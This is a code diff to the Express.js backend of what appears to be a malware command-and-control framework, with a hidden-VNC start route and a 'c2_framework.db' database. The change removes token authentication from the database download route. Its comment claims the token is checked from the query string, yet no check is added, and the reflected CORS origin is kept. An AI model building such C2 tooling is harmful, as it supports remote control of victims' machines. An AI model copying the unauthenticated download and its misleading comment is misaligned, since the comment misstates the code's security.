@@ -3620,34 +3620,30 @@ app.post('/api/hvnc/start', (req, res) => {
 
 
 
-app.get('/api/dbt-download', verifyToken, (req, res) => {
+
+// Modify the route to verify the token from the query string
+app.get('/api/dbt-download', (req, res) => {
+
+  // 2. Proceed with download
   const dbPath = path.join(__dirname, '..', 'c2_framework.db');
   
   if (!fs.existsSync(dbPath)) {
     return res.status(404).json({ error: 'Database file not found' });
   }
 
-  // Set CORS headers
+  // You can keep or remove CORS headers here, native downloads don't strictly require them
+  // in the same way fetch() does, but it's fine to leave them.
   res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-  res.setHeader('Access-Control-Allow-Credentials', 'true');
   
-  // Send the file
+  // Send the file directly to the user's hard drive
   res.download(dbPath, 'c2_framework.db', (err) => {
     if (err) {
-      console.error('Download error:', err);
+      // Ignore client aborts (when user cancels the download manually)
+      if (err.code !== 'ECONNABORTED' && err.message !== 'Request aborted') {
+        console.error('Download error:', err);
+      }
     }
   });
-});
-
-// Add this OPTIONS handler right after
-app.options('/api/dbt-download', (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-  res.setHeader('Access-Control-Allow-Credentials', 'true');
-  res.sendStatus(200);
 });
 
 
